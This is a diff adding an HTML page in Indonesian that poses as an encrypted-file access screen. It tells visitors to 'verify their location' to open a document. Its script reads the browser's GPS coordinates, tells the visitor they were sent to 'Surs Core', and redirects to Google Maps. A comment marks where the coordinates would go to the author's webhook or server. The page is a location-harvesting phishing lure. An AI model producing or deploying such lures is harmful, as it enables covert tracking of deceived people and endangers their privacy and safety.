@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Surs Core - Secure Access</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
+        button { padding: 15px 30px; background: #0f0; border: none; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>FILE ENCRYPTED</h1>
+    <p>Klik tombol di bawah untuk memverifikasi lokasi Anda & membuka dokumen.</p>
+    <button onclick="getLocation()">VERIFIKASI IDENTITAS</button>
+
+    <script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+        } else {
+            alert("Browser tidak mendukung GPS.");
+        }
+    }
+
+    function showPosition(position) {
+        let lat = position.coords.latitude;
+        let lon = position.coords.longitude;
+        
+        // Logika pengiriman data: Kirim koordinat ke Webhook/Server Anda
+        console.log("Koordinat Terkunci: " + lat + ", " + lon);
+        alert("Koordinat Berhasil Dikirim ke Surs Core!\nLat: " + lat + "\nLon: " + lon);
+        
+        // Redirect ke Google Maps untuk menunjukkan lokasi asli mereka
+        window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+    }
+
+    function showError(error) {
+        alert("Akses Ditolak. Gagal membuka file.");
+    }
+    </script>
+</body>
+</html>
